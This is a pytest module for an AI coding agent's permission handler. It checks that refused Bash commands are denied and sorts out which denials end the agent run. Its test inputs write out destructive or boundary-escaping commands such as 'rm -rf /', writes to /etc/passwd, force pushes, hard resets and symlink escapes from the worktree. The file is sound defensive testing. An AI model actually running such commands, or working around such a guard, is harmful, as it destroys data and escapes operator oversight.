"""Permission handler tests covering the Tier 1.5 fast path (mika#1191 Phase A).

The full `create_permission_handler` flow is exercised by the CLI/agent tests;
this module unit-tests the deterministic short-circuits introduced for the
mika-relay deprecation milestone, where the relay-bound LLM hop must not fire
for events that are equivalent to TIER 1.5 in
`mika/skills/bundled/permission-policy/system_prompt.md`.
"""

from __future__ import annotations

import asyncio
import hashlib
import re
import shutil
import uuid
from pathlib import Path

import pytest
from claude_agent_sdk import PermissionResultAllow, PermissionResultDeny
from claude_agent_sdk.types import ToolPermissionContext

from claude_pilot import permissions as permissions_module
from claude_pilot.guardrails import SessionGuardrails
from claude_pilot.permissions import create_permission_handler, try_tier_1_5_auto_answer
from claude_pilot.types import (
    GUARDRAIL_DEFAULTS,
    PilotConfig,
    PilotEvent,
    PilotResponseAllow,
    PilotResponseAnswer,
)


def test_compact_safe_question_auto_answered() -> None:
    question = "Choose between full compound and compact-safe compaction modes:"
    result = try_tier_1_5_auto_answer(
        "AskUserQuestion",
        {"questions": [{"question": question, "options": []}]},
    )
    assert isinstance(result, PilotResponseAnswer)
    assert result.action == "answer"
    assert result.answers == {question: "compact-safe"}


def test_compact_safe_keyword_match_case_insensitive() -> None:
    question = "Run Compact-Safe mode for this session?"
    result = try_tier_1_5_auto_answer(
        "AskUserQuestion",
        {"questions": [{"question": question}]},
    )
    assert isinstance(result, PilotResponseAnswer)
    assert result.answers == {question: "compact-safe"}


def test_non_compact_safe_question_returns_none() -> None:
    result = try_tier_1_5_auto_answer(
        "AskUserQuestion",
        {"questions": [{"question": "What's the capital of France?"}]},
    )
    assert result is None


def test_non_ask_user_question_tool_returns_none() -> None:
    # The short-circuit is gated on tool_name; never fire for Bash/Write/etc.
    result = try_tier_1_5_auto_answer(
        "Bash",
        {"command": "echo compact-safe"},
    )
    assert result is None


def test_partial_match_falls_through_to_relay() -> None:
    # Mixed AskUserQuestion: one question matches compact-safe, another does
    # not. Returning a partial answer would leave the non-matching question
    # unanswered and break the SDK contract — fall through instead.
    result = try_tier_1_5_auto_answer(
        "AskUserQuestion",
        {
            "questions": [
                {"question": "Choose compact-safe or full compound:"},
                {"question": "Pick a database flavor:"},
            ],
        },
    )
    assert result is None


def test_empty_questions_returns_none() -> None:
    assert try_tier_1_5_auto_answer("AskUserQuestion", {}) is None
    assert try_tier_1_5_auto_answer("AskUserQuestion", {"questions": []}) is None
    assert try_tier_1_5_auto_answer("AskUserQuestion", {"questions": "not a list"}) is None


def test_malformed_question_shape_returns_none() -> None:
    # A non-dict entry inside the questions list is malformed; fall through.
    result = try_tier_1_5_auto_answer(
        "AskUserQuestion",
        {"questions": ["compact-safe"]},
    )
    assert result is None


def test_compact_safe_word_boundary_excludes_compact_safer() -> None:
    # Word boundary (\bcompact-safe\b) prevents matching substrings like
    # "compact-safer" or "compact-safety", which could otherwise hijack
    # unrelated questions through the lexical loophole flagged in ce:review.
    result = try_tier_1_5_auto_answer(
        "AskUserQuestion",
        {"questions": [{"question": "Is compact-safer mode preferred?"}]},
    )
    assert result is None


def test_compact_safe_word_boundary_matches_punctuated_forms() -> None:
    # Word boundary still matches "compact-safe?", "(compact-safe)", etc.
    for question_text in (
        "Choose: compact-safe.",
        "Pick (compact-safe) or full compound?",
        'Answer with "compact-safe".',
    ):
        result = try_tier_1_5_auto_answer(
            "AskUserQuestion",
            {"questions": [{"question": question_text}]},
        )
        assert isinstance(result, PilotResponseAnswer), question_text


def test_non_string_question_field_returns_none() -> None:
    # Defensive guard: PilotEvent payloads from older mika versions may have
    # malformed question shapes. Fall through to relay rather than crash.
    result = try_tier_1_5_auto_answer(
        "AskUserQuestion",
        {"questions": [{"question": 42}]},
    )
    assert result is None


def test_missing_question_key_returns_none() -> None:
    # Dict without a "question" key gets q.get("question", "") -> "", which
    # has no compact-safe substring, so falls through.
    result = try_tier_1_5_auto_answer(
        "AskUserQuestion",
        {"questions": [{"options": ["a", "b"]}]},
    )
    assert result is None


# ────────────────────────────────────────────────────────────────────────────
# Denial lethality (cpp#20 joint 2, NARROWED by cpp#128)
#
# A refusal is always a refusal. `interrupt=True` — which additionally aborts
# the SDK agent loop — is reserved for a destination veto and for
# tier3-dangerous Bash. Every test below asserts the refusal FIRST; the
# lethality assertion is secondary and is the only thing cpp#128 moved.
# ────────────────────────────────────────────────────────────────────────────


def _mock_ctx() -> ToolPermissionContext:
    return ToolPermissionContext(
        signal=None,
        suggestions=[],
        tool_use_id="tool_test",
        agent_id=None,
    )


def test_handler_default_deny_of_a_tier3_command_is_terminal() -> None:
    """Handler under fail-closed policy (missing file → empty Policy →
    default-deny) refuses, and — because the fixture command is tier3-dangerous
    — also halts, which is the contract dispatch-lib relies on to see a terminal
    ResultJson rather than continue past a silent denial.

    Post-cpp#128 the halt follows from the COMMAND being tier3, not from the
    denial being a default-deny: a default-deny of an ordinary command is
    refused non-terminally. The non-terminal half is pinned by
    ``test_handler_rule_deny_refuses_without_killing_the_session`` and by
    ``test_denial_is_terminal_predicate``.
    """
    handler = create_permission_handler(
        config=None,
        relay=False,
        verbose=False,
        cwd="/tmp",
        policy_path=Path("/nonexistent/policy.yaml"),
    )
    result = asyncio.run(handler("Bash", {"command": "rm -rf /"}, _mock_ctx()))
    assert isinstance(result, PermissionResultDeny), (
        f"expected PermissionResultDeny, got {type(result)}: {result!r}"
    )
    assert result.interrupt is True, (
        f"expected interrupt=True for cpp#20 joint 2 contract, got {result!r}"
    )


def test_handler_rule_deny_refuses_without_killing_the_session(tmp_path: Path) -> None:
    """An explicit rule-based deny REFUSES the command -- and, since cpp#128,
    does so without aborting the run, because ``curl https://example.com`` is
    not tier3-dangerous. The decision is unchanged from the pre-cpp#128
    contract; only the lethality is.

    Uses ``curl`` because Tier 1 fast-path auto-approves common safe
    binaries (echo, awk, find, etc.); we need a command that misses
    Tier 1 so the request reaches the policy evaluator.
    """
    policy_file = tmp_path / "rule_deny.yaml"
    policy_file.write_text(
        "rules:\n"
        "  - id: deny-curl\n"
        "    tool: Bash\n"
        "    pattern: '^curl\\s'\n"
        "    decision: deny\n"
        "    reason: rule-based test deny\n"
        "default:\n"
        "  decision: allow\n"
        "  reason: default allow (test fixture)\n"
    )
    handler = create_permission_handler(
        config=None,
        relay=False,
        verbose=False,
        cwd="/tmp",
        policy_path=policy_file,
    )
    result = asyncio.run(handler("Bash", {"command": "curl https://example.com"}, _mock_ctx()))
    assert isinstance(result, PermissionResultDeny)
    assert result.message == "rule-based test deny"
    assert result.interrupt is False, (
        "cpp#128: a non-tier3 rule deny is refused but must not abort the loop"
    )


def test_handler_returns_interrupt_true_on_escalate_decision(tmp_path: Path) -> None:
    """The wire-format ``escalate`` decision (renamed in source to
    deny-with-notify) returns interrupt=True.

    cpp#128 deliberately did NOT touch this path. ``escalate`` exists to put a
    human in the loop, so continuing past it defeats its purpose; it is outside
    the class cpp#128 measured (every killed session logged ``[policy:deny]``,
    none ``[policy:deny_with_notify]``); and ``_fire_notify`` has no dedup, so a
    non-terminal escalate would turn a retry loop into a notification flood.
    """
    policy_file = tmp_path / "escalate.yaml"
    policy_file.write_text(
        "rules:\n"
        "  - id: escalate-skill\n"
        "    tool: Skill\n"
        "    pattern: '^test-target$'\n"
        "    decision: escalate\n"
        "    reason: rule-based test escalate\n"
        "default:\n"
        "  decision: allow\n"
        "  reason: default allow (test fixture)\n"
    )
    handler = create_permission_handler(
        config=None,
        relay=False,
        verbose=False,
        cwd="/tmp",
        policy_path=policy_file,
    )
    # Use monkeypatched notify so the test does not actually call mika notify.
    from claude_pilot import permissions as permissions_module

    fired: list[tuple[str, str, str]] = []

    def _fake_notify(tool_name: str, detail: str, reason: str) -> None:
        fired.append((tool_name, detail, reason))

    original = permissions_module._fire_notify
    permissions_module._fire_notify = _fake_notify  # type: ignore[assignment]
    try:
        result = asyncio.run(handler("Skill", {"skill": "test-target"}, _mock_ctx()))
    finally:
        permissions_module._fire_notify = original  # type: ignore[assignment]

    assert isinstance(result, PermissionResultDeny)
    assert result.message == "rule-based test escalate"
    assert result.interrupt is True, (
        "escalate (deny-with-notify) must also halt the loop"
    )
    # Notify fired exactly once on this path.
    assert len(fired) == 1


# ────────────────────────────────────────────────────────────────────────────
# cpp#144: absent-operator AskUserQuestion marks the session on policy:deny
# ────────────────────────────────────────────────────────────────────────────


def test_denied_ask_user_question_marks_the_session(tmp_path: Path) -> None:
    """The headless-pilot shape from cpp#144: a fail-closed default deny (no
    policy rule matches AskUserQuestion, so it falls to the policy default)
    refuses the call — non-terminally, since AskUserQuestion is not Bash — and
    records it on the guardrail so agent.py can reclassify a later "success"
    that never delivered."""
    guardrails = SessionGuardrails(GUARDRAIL_DEFAULTS.model_copy())
    handler = create_permission_handler(
        config=None,
        relay=False,
        verbose=False,
        cwd="/tmp",
        guardrails=guardrails,
        policy_path=tmp_path / "nonexistent.yaml",  # missing -> fail-closed deny
    )
    result = asyncio.run(
        handler(
            "AskUserQuestion",
            {"questions": [{"question": "Which branch should I use?"}]},
            _mock_ctx(),
        )
    )
    assert isinstance(result, PermissionResultDeny)
    assert result.interrupt is False, (
        "AskUserQuestion is not Bash — cpp#128's non-lethal-denial contract "
        "must leave the run alive so it can bypass or adapt"
    )
    assert guardrails.operator_question_denied is True
    assert guardrails.operator_question_summary is not None
    assert "Which branch should I use?" in guardrails.operator_question_summary


def test_denied_bash_command_does_not_mark_operator_question(tmp_path: Path) -> None:
    """Name-guard coverage (mirrors mika#940's pr_created tool-name guard): a
    denied Bash command must NOT flip operator_question_denied, even though
    it goes through the same deny branch."""
    guardrails = SessionGuardrails(GUARDRAIL_DEFAULTS.model_copy())
    handler = create_permission_handler(
        config=None,
        relay=False,
        verbose=False,
        cwd="/tmp",
        guardrails=guardrails,
        policy_path=tmp_path / "nonexistent.yaml",
    )
    result = asyncio.run(handler("Bash", {"command": "curl https://example.com"}, _mock_ctx()))
    assert isinstance(result, PermissionResultDeny)
    assert guardrails.operator_question_denied is False
    assert guardrails.operator_question_summary is None


def test_denied_ask_user_question_without_guardrails_does_not_crash(
    tmp_path: Path,
) -> None:
    """`guardrails=None` (e.g. a caller that doesn't wire session tracking)
    must not raise — the cpp#144 marker call is guarded the same way as the
    existing `pause_idle_timer` / `resume_idle_timer` calls in this module."""
    handler = create_permission_handler(
        config=None,
        relay=False,
        verbose=False,
        cwd="/tmp",
        guardrails=None,
        policy_path=tmp_path / "nonexistent.yaml",
    )
    result = asyncio.run(
        handler("AskUserQuestion", {"questions": [{"question": "ok?"}]}, _mock_ctx())
    )
    assert isinstance(result, PermissionResultDeny)


# ────────────────────────────────────────────────────────────────────────────
# cpp#56: PilotEvent enriched from ToolPermissionContext
# ────────────────────────────────────────────────────────────────────────────


def _enriched_ctx() -> ToolPermissionContext:
    return ToolPermissionContext(
        signal=None,
        suggestions=[],
        tool_use_id="tool_test",
        agent_id="agent_x",
        decision_reason="needs review",
        blocked_path="/etc/passwd",
        title="Read sensitive file",
        display_name="Read",
        description="reads a file outside the workspace",
    )


def _capture_relay_event(
    monkeypatch: pytest.MonkeyPatch, ctx: ToolPermissionContext
) -> PilotEvent:
    """Drive the relay path (policy disabled) and capture the PilotEvent that
    permissions.py constructs from ``ctx``."""
    monkeypatch.setenv("MIKA_PILOT_POLICY_DISABLED", "1")
    captured: dict[str, PilotEvent] = {}

    async def _fake_invoke(_config: PilotConfig, event: PilotEvent, *_a: object) -> PilotResponseAllow:
        captured["event"] = event
        return PilotResponseAllow(action="allow")

    monkeypatch.setattr(permissions_module, "invoke_command", _fake_invoke)

    handler = create_permission_handler(
        config=PilotConfig(command="true"),
        relay=True,
        verbose=False,
        cwd="/tmp",
    )
    # "rm -rf /" misses Tier 1 / Tier 1.5; with policy disabled it reaches relay.
    asyncio.run(handler("Bash", {"command": "rm -rf /"}, ctx))
    return captured["event"]


def test_pilot_event_carries_enriched_context_fields(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """cpp#56 present path: all five enriched ToolPermissionContext fields are
    captured onto the relay PilotEvent."""
    event = _capture_relay_event(monkeypatch, _enriched_ctx())
    assert event.decision_reason == "needs review"
    assert event.blocked_path == "/etc/passwd"
    assert event.title == "Read sensitive file"
    assert event.display_name == "Read"
    assert event.description == "reads a file outside the workspace"


def test_pilot_event_absent_context_fields_are_none(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """cpp#56 absent path: a ctx without the enriched fields yields None on the
    PilotEvent (getattr defaults) and does not crash. `_mock_ctx()` is exactly
    such a bare context (only tool_use_id + agent_id set)."""
    event = _capture_relay_event(monkeypatch, _mock_ctx())
    assert event.decision_reason is None
    assert event.blocked_path is None
    assert event.title is None
    assert event.display_name is None
    assert event.description is None
    # exclude_none keeps the absent fields out of the serialized payload.
    assert "title" not in event.model_dump_json(exclude_none=True)


# ────────────────────────────────────────────────────────────────────────────
# cpp#128 — denial lethality, with an explicit negative control
#
# Founding measurement (cpp#128 body): across the 60 most recent pilot sessions
# in `/var/log/claude-pilot/*.stderr`, 11 carried a `[policy:deny]`, 11 ended in
# `error_during_execution`, and they were the SAME 11 -- tool-call counts
# 22, 5, 5, 4, 4, 3, 3, 2, 2, 2, 1, no zero among them. Every session that did
# any work was killed by a refusal. The reference session is
# `09fee003-b3db-432f-b3c2-331bfaa6ee05` (mika#1963, 19:53->20:23, 4 calls,
# zero output), killed by the read-only `for` shape replayed below.
# ────────────────────────────────────────────────────────────────────────────

_BUNDLED_POLICY = (
    Path(__file__).parent.parent
    / "src"
    / "claude_pilot"
    / "policies"
    / "permissions.yaml"
)

# The exact shape that killed session 09fee003 (cpp#128 body). Read-only: a
# glob over directories, an `echo` label, a `cat`.
_SESSION_09FEE003_COMMAND = (
    'for d in /tmp/wt/worktrees/*/; do echo "=== $d ==="; cat "$d/mika/.git"; done | head -40'
)


def _bundled_handler(cwd: str = "/tmp"):
    return create_permission_handler(
        config=None,
        relay=False,
        verbose=False,
        cwd=cwd,
        policy_path=_BUNDLED_POLICY,
    )


def test_session_09fee003_shape_is_refused_but_no_longer_lethal(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """ANTI-VACUITY NEGATIVE CONTROL (cpp#128).

    Two arms over the SAME command, so the test cannot pass in both worlds.
    Both arms route through the chain-veto site (rule
    ``bash-for-loop-orientation:chain-veto``), and that is exactly what they
    pin -- no more:

    * Arm 1 -- with the fix, the command is still REFUSED (nothing was widened)
      and the run survives. Revert that site to ``interrupt=True`` and this arm
      fails. It does NOT distinguish the helper from a hard-coded ``False``.
    * Arm 2 -- forcing ``_denial_is_terminal`` to ``True`` must kill the session
      again, which pins that the site READS the module-level helper rather than
      a constant. Hard-code ``interrupt=False`` there and this arm fails.

    The helper's own classification is pinned separately by
    ``test_denial_is_terminal_predicate``; the deny and escalate sites by their
    own paired tests.
    """
    handler = _bundled_handler()

    # Arm 1 — post-fix behavior.
    result = asyncio.run(
        handler("Bash", {"command": _SESSION_09FEE003_COMMAND}, _mock_ctx())
    )
    assert isinstance(result, PermissionResultDeny), (
        "cpp#128 widens no rule: the shape must still be refused"
    )
    assert result.interrupt is False, (
        "cpp#128: a refused read-only probe must not abort the agent loop"
    )

    # Arm 2 — negative control: pre-fix contract restored, session dies again.
    monkeypatch.setattr(
        permissions_module,
        "_denial_is_terminal",
        lambda tool_name, tool_input, cwd: True,
    )
    pre_fix = asyncio.run(
        handler("Bash", {"command": _SESSION_09FEE003_COMMAND}, _mock_ctx())
    )
    assert isinstance(pre_fix, PermissionResultDeny)
    assert pre_fix.interrupt is True, (
        "negative control: with interrupt=True restored the session must die -- "
        "if this passes with the helper bypassed, the call sites ignore it"
    )


def test_nonlethal_denial_still_emits_the_audit_event(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """A refusal that no longer kills the session must still be VISIBLE.

    cpp#128 changes lethality only: the cm#99 permission event fires with
    ``decision == "deny"`` and the producing rule id, exactly as before.
    """
    captured: list[dict[str, object]] = []

    def _capture(**kwargs: object) -> None:
        captured.append(kwargs)

    monkeypatch.setattr(permissions_module.permission_events, "emit", _capture)

    result = asyncio.run(
        _bundled_handler()("Bash", {"command": _SESSION_09FEE003_COMMAND}, _mock_ctx())
    )
    assert isinstance(result, PermissionResultDeny)
    assert result.interrupt is False

    assert len(captured) == 1, f"expected exactly one permission event, got {captured}"
    event = captured[0]
    assert event["decision"] == "deny"
    assert event["tool_name"] == "Bash"
    assert event["rule_id"], "the refusal must carry the rule id that produced it"


def test_tier3_dangerous_denial_stays_lethal() -> None:
    """The class cpp#128 deliberately did NOT touch. A dangerous tail chained
    onto an allowed prefix is caught by the whole-string tier3 search and still
    ends the run.
    """
    result = asyncio.run(
        _bundled_handler()("Bash", {"command": "mkdir x && rm -rf /tmp/y"}, _mock_ctx())
    )
    assert isinstance(result, PermissionResultDeny)
    assert result.interrupt is True


def test_devnull_redirect_denial_is_refused_but_not_lethal() -> None:
    """cpp#130: a read-only command whose only tier3 trigger is a redirect to the
    inert /dev/null sink is still REFUSED, but no longer ends the run.

    Negative control in the same test: `echo hi > /etc/passwd` is a real write and
    stays terminal — the two-character difference #130 names is now the difference
    between a fatal write and an adaptable refusal, not between life and death for
    an equally harmless command.
    """
    handler = _bundled_handler()

    devnull = asyncio.run(
        handler("Bash", {"command": "grep -c a b >/dev/null 2>&1"}, _mock_ctx())
    )
    assert isinstance(devnull, PermissionResultDeny), (
        "a >/dev/null redirect is still refused — cpp#130 does not widen any allow"
    )
    assert devnull.interrupt is False, (
        "a redirect to the inert /dev/null sink must not kill the session (cpp#130)"
    )

    real_write = asyncio.run(
        handler("Bash", {"command": "echo hi > /etc/passwd"}, _mock_ctx())
    )
    assert isinstance(real_write, PermissionResultDeny)
    assert real_write.interrupt is True, (
        "a redirect to a real write target stays terminal in both worlds"
    )


def test_denial_is_terminal_predicate(tmp_path: Path) -> None:
    """Unit-level truth table for the helper (cpp#128 R1-R5)."""
    f = permissions_module._denial_is_terminal
    wt = str(tmp_path)
    # cpp#130 — a redirect to the inert /dev/null sink is refused but NOT fatal;
    # a real write target, or danger chained alongside it, stays fatal.
    assert f("Bash", {"command": "grep -c a b >/dev/null"}, wt) is False
    assert f("Bash", {"command": "grep -c a b >/dev/null 2>&1"}, wt) is False
    assert f("Bash", {"command": "echo hi > /etc/passwd"}, wt) is True
    assert f("Bash", {"command": "rm -rf /tmp/y >/dev/null"}, wt) is True
    # R1 — ordinary refused Bash: non-lethal.
    assert f("Bash", {"command": 'echo "label"; grep -c foo bar.rs'}, wt) is False
    assert f("Bash", {"command": _SESSION_09FEE003_COMMAND}, wt) is False
    # R2 — tier3-dangerous Bash: lethal, including as a chained tail.
    assert f("Bash", {"command": "rm -rf /"}, wt) is True
    assert f("Bash", {"command": "mkdir x && rm -rf /tmp/y"}, wt) is True
    assert f("Bash", {"command": "git push --force origin x"}, wt) is True
    # R3 — a containment escape is lethal on EVERY route, not only on the one
    # that happens to match a write-capable allow rule. Coverage is exactly
    # `_segment_write_kind`'s: `mkdir`, `cp`/`mv`, and `git show >`. A verb it
    # does not classify (`touch`, `tee`, ...) is still REFUSED — nothing is
    # written — but non-terminally; closing that gap means teaching
    # `_segment_write_kind` more verbs, which is a separate change.
    assert f("Bash", {"command": "mkdir -p /definitely/outside/x"}, wt) is True
    assert f("Bash", {"command": "cp a.txt /definitely/outside/b.txt"}, wt) is True
    assert f("Bash", {"command": "mv a.txt /definitely/outside/b.txt"}, wt) is True
    # ...and an in-worktree write of the same shape is not.
    assert f("Bash", {"command": "mkdir -p docs/plans"}, wt) is False
    # cpp#143 — the ONE exception to R3: a `mkdir` scratch directory under
    # `/tmp` is outside the worktree but sanctioned (symmetric with the
    # existing `cat > /tmp/x <<'EOF'` file exception), so it is NOT lethal.
    # `cp`/`mv` into `/tmp` are untouched by this exception and stay lethal.
    assert f("Bash", {"command": "mkdir -p /tmp/rt005-scratch"}, wt) is False
    assert f("Bash", {"command": "cp a.txt /tmp/escaped.txt"}, wt) is True
    assert f("Bash", {"command": "mv a.txt /tmp/escaped.txt"}, wt) is True
    # R4 — non-Bash tools have no tier3 or destination notion: non-lethal.
    assert f("Skill", {"skill": "test-target"}, wt) is False
    assert f("Write", {"file_path": "/etc/passwd", "content": "x"}, wt) is False
    # R5 — no parseable command fails closed, in BOTH of its forms: a missing
    # key and a non-string value are the same condition and must not classify
    # oppositely.
    assert f("Bash", {"command": None}, wt) is True
    assert f("Bash", {"command": ["rm", "-rf", "/"]}, wt) is True
    assert f("Bash", {}, wt) is True
    # An explicitly empty command IS parseable, and is not dangerous.
    assert f("Bash", {"command": ""}, wt) is False


def test_cpp213_rm_under_pilot_scratch_is_survivable_but_still_refused(
    tmp_path: Path,
) -> None:
    """cpp#213: an `rm`/`rmdir` whose operands ALL resolve under
    ``<worktree>/.pilot-scratch/`` is a SURVIVABLE deny — `_denial_is_terminal`
    returns ``False`` — while everything else stays terminal, unchanged.

    Sibling of the cpp#201/#209 mktemp lethality carve. The command is still
    REFUSED (admission is byte-identical — see
    ``test_cpp213_admission_is_byte_identical_only_lethality_flips``); only the
    lethality flips.
    """
    f = permissions_module._denial_is_terminal
    worktree = tmp_path / "wt"
    (worktree / ".git").mkdir(parents=True)
    (worktree / ".pilot-scratch" / "x").mkdir(parents=True)
    (worktree / "src").mkdir()
    wt = str(worktree)

    # Positive — proven-danger cause is SOLELY rm/rmdir wholly under the prefix,
    # so the deny is non-terminal.
    for cmd in (
        "rm -rf .pilot-scratch/x",
        "rmdir .pilot-scratch/x",
        "rm -r .pilot-scratch",
        "rm .pilot-scratch/f",
        "rm -rf .pilot-scratch",  # the scratch root itself counts as under it
        "rm -rf -- .pilot-scratch/x",  # `--` end-of-options
        "echo hi && rm -rf .pilot-scratch/x",  # harmless prefix + confined rm
    ):
        assert f("Bash", {"command": cmd}, wt) is False, cmd

    # Negative — any operand outside the prefix, a mixed list, or another
    # proven-danger cause keeps the deny TERMINAL.
    for cmd in (
        "rm -rf ../.pilot-scratch",  # `..` escape upward
        "rm -rf .pilot-scratch/../src",  # `..` escape back into the worktree
        "rm -rf /tmp/x",  # absolute path
        "rm -rf src",  # elsewhere in the worktree
        "rm -rf ~/.pilot-scratch",  # `~` respelling
        "rm -rf .pilot-scratch/x /etc/y",  # mixed operands in one rm
        "rm -rf .pilot-scratch/x && git reset --hard",  # chained destructive verb
        "rm -rf .pilot-scratch/x && rm -rf /etc",  # a second, unconfined rm
    ):
        assert f("Bash", {"command": cmd}, wt) is True, cmd


def test_cpp213_symlinked_pilot_scratch_pointing_outside_stays_terminal(
    tmp_path: Path,
) -> None:
    """cpp#213 fail-closed: a `.pilot-scratch` that is a symlink OUT of the
    worktree must not launder an escape. The scratch root is the LITERAL
    ``<cwd>/.pilot-scratch``, so a target resolved THROUGH the outbound symlink
    lands outside it and stays terminal.
    """
    worktree = tmp_path / "wt"
    (worktree / ".git").mkdir(parents=True)
    outside = tmp_path / "outside"
    outside.mkdir()
    (worktree / ".pilot-scratch").symlink_to(outside, target_is_directory=True)
    assert (
        permissions_module._denial_is_terminal(
            "Bash", {"command": "rm -rf .pilot-scratch/x"}, str(worktree)
        )
        is True
    )


def test_cpp213_unresolvable_cwd_stays_terminal(tmp_path: Path) -> None:
    """cpp#213 fail-closed: a `cwd` that cannot be resolved (git unavailable,
    cwd outside the repo) makes the prefix un-computable, so the confined-rm
    carve never applies and the deny stays terminal.
    """
    missing = str(tmp_path / "does-not-exist")
    assert (
        permissions_module._denial_is_terminal(
            "Bash", {"command": "rm -rf .pilot-scratch/x"}, missing
        )
        is True
    )


def test_mika2565_sed_i_in_worktree_is_survivable_but_still_refused(
    tmp_path: Path,
) -> None:
    """mika#2565 (case B): a `sed -i` substitution editing RELATIVE files that
    all resolve inside the worktree is a SURVIVABLE deny — `_denial_is_terminal`
    returns ``False`` — while every escape stays terminal, unchanged.

    Sibling of the cpp#213 rm/.pilot-scratch carve. The command is still REFUSED
    (admission byte-identical — see
    ``test_mika2565_admission_is_byte_identical_only_lethality_flips``); only
    lethality flips, so the pilot falls back to the Edit tool.
    """
    f = permissions_module._denial_is_terminal
    worktree = tmp_path / "wt"
    (worktree / ".git").mkdir(parents=True)
    (worktree / "crates" / "mika-agent" / "src" / "evidence").mkdir(parents=True)
    (worktree / "src").mkdir()
    wt = str(worktree)

    guards = "crates/mika-agent/src/evidence/guards.rs"
    # The verbatim mika#2565 incident command (session 6d61c747).
    incident = (
        "sed -i '5870,5990s/classify_dependabot_verdict(/classify_2519(/' "
        + guards
        + ' && grep -n "classify_dependabot_verdict\\|classify_2519(" '
        + guards
    )

    # cpp#243: a MULTI-expression substitution script (several `s///` separated
    # by `;`, or several `-e`) on relative in-worktree files is survivable too —
    # cpp#229 only carved the single-substitution shape.
    multi_verbatim = (
        "sed -i 's/merged_pr(1900, branch, 60)/merged_pr(1900, branch, X)/g; "
        's/merged_pr(1900, "feat\\/1888\\/research", 60)/'
        'merged_pr(1900, "feat\\/1888\\/research", X)/g; '
        "s/foo/bar/g' " + guards
    )

    # Positive — proven-danger cause is SOLELY an in-worktree `sed -i` substitution.
    for cmd in (
        incident,
        "sed -i 's/a/b/' " + guards,
        "sed -i '5870,5990s/foo(/bar(/' " + guards,
        "sed -i 's@a@b@g' src/x.rs",
        "echo hi && sed -i 's/a/b/' src/x.rs",  # harmless prefix + confined sed -i
        multi_verbatim,  # cpp#243 verbatim #2482 shape
        "sed -i 's/a\\/b/c/g; s/d/e/g' src/x.rs",  # multi-`;`, escaped separator
        "sed -i 's/a/b/g;s/c/d/g' src/x.rs",  # multi-`;`, no whitespace
        "sed -i -e 's/a/b/' -e 's/c/d/' src/x.rs",  # multiple `-e` scripts
        'sed -i \'s/a"x"b/c/g; s/d/e/g\' src/x.rs',  # embedded double-quotes
    ):
        assert f("Bash", {"command": cmd}, wt) is False, cmd

    # Negative — any escape, a write/exec script, a mixed list, or another
    # proven-danger cause keeps the deny TERMINAL.
    for cmd in (
        "sed -i 's/a/b/' /etc/passwd",  # absolute, out of worktree
        'sed -i "s/a/b/" "$HOME/x"',  # $-rooted respelling
        "sed -i 's/a/b/' ~/x",  # ~-rooted respelling
        "sed -i 's/a/b/' ../../etc/x",  # `..` escape
        "sed -i 's/a/b/w /etc/evil' src/x.rs",  # `w` write flag in the script → rejected
        "sed -i 's/a/b/g; w /etc/x' src/x.rs",  # `w` write COMMAND after `;` → rejected
        "sed -i -e 's/a/b/g' -e 's/c/d/w /tmp/x' src/x.rs",  # `w` in a later `-e`
        "sed -i '/foo/d' src/x.rs",  # non-substitution (delete) script → fail closed
        "sed -i 's/a/b/g; s/c/d/g' /etc/hosts",  # multi-sub but absolute target
        "sed -i -f script.sed src/x.rs",  # external script file → fail closed
        "sed -i 's/a/b/' src/x.rs /etc/passwd",  # mixed targets, one absolute
        "sed -i 's/a/b/' src/x.rs && git reset --hard",  # chained destructive verb
        "sed -i 's/a/b/' src/x.rs ; rm -rf x",  # `;` OUTSIDE quotes + dangerous verb
    ):
        assert f("Bash", {"command": cmd}, wt) is True, cmd


def test_mika2565_sed_i_symlink_escape_stays_terminal(tmp_path: Path) -> None:
    """mika#2565 fail-closed: a `sed -i` target routed through an OUTBOUND
    symlink resolves outside the worktree and stays terminal — `is_within_project`
    resolves symlinks, so the containment verdict is not launderable.
    """
    worktree = tmp_path / "wt"
    (worktree / ".git").mkdir(parents=True)
    outside = tmp_path / "outside"
    outside.mkdir()
    (worktree / "esc").symlink_to(outside, target_is_directory=True)
    assert (
        permissions_module._denial_is_terminal(
            "Bash", {"command": "sed -i 's/a/b/' esc/x.rs"}, str(worktree)
        )
        is True
    )


def test_mika2565_unresolvable_cwd_stays_terminal(tmp_path: Path) -> None:
    """mika#2565 fail-closed: an unresolvable `cwd` makes containment
    un-computable, so the `sed -i` carve never applies and the deny stays
    terminal.
    """
    missing = str(tmp_path / "does-not-exist")
    assert (
        permissions_module._denial_is_terminal(
            "Bash", {"command": "sed -i 's/a/b/' src/x.rs"}, missing
        )
        is True
    )


def test_mika2565_admission_is_byte_identical_only_lethality_flips(
    tmp_path: Path,
) -> None:
    """mika#2565 sovereign boundary: admission for the in-worktree `sed -i` case
    is byte-identical to HEAD — the command is STILL denied. `sed -i` is still
    tier3-dangerous (the REFUSAL classifier), never tier1-auto-approved, and the
    policy still default-denies it. Only `_denial_is_terminal` flips
    terminal→survivable; end-to-end the handler returns a non-terminal
    ``PermissionResultDeny``, never an allow.
    """
    from claude_pilot.policy import evaluate, load_policy
    from claude_pilot.tier1 import is_tier1_auto_approve, is_tier3_dangerous

    worktree = tmp_path / "wt"
    (worktree / ".git").mkdir(parents=True)
    (worktree / "src").mkdir()
    cmd = "sed -i 's/a/b/' src/x.rs"

    assert is_tier3_dangerous(cmd) is True
    assert is_tier1_auto_approve("Bash", {"command": cmd}, str(worktree)) is False
    policy = load_policy(_BUNDLED_POLICY)
    assert evaluate(policy, "Bash", {"command": cmd}).decision == "deny"

    result = asyncio.run(
        _bundled_handler(cwd=str(worktree))("Bash", {"command": cmd}, _mock_ctx())
    )
    assert isinstance(result, PermissionResultDeny)
    assert result.interrupt is False


def test_cpp253_sed_i_suffix_in_worktree_is_survivable_but_still_refused(
    tmp_path: Path,
) -> None:
    """cpp#253 (mika#2601): a `sed -i` with a GNU backup SUFFIX (`-i.bak`,
    `-i.orig`) editing RELATIVE files that all resolve inside the worktree — and
    whose `<file><SUFFIX>` backup ALSO lands inside it — is a SURVIVABLE deny
    (`_denial_is_terminal` returns ``False``), exactly like the bare `-i` case
    (#229/#245). Every escape / write / chained-danger shape stays terminal.

    Direct extension of the mika#2565 (#229/#245) carve to the suffix forms. The
    command is still REFUSED (admission byte-identical — see
    ``test_cpp253_admission_is_byte_identical_only_lethality_flips``); only
    lethality flips, so the pilot falls back to the Edit tool instead of dying.
    """
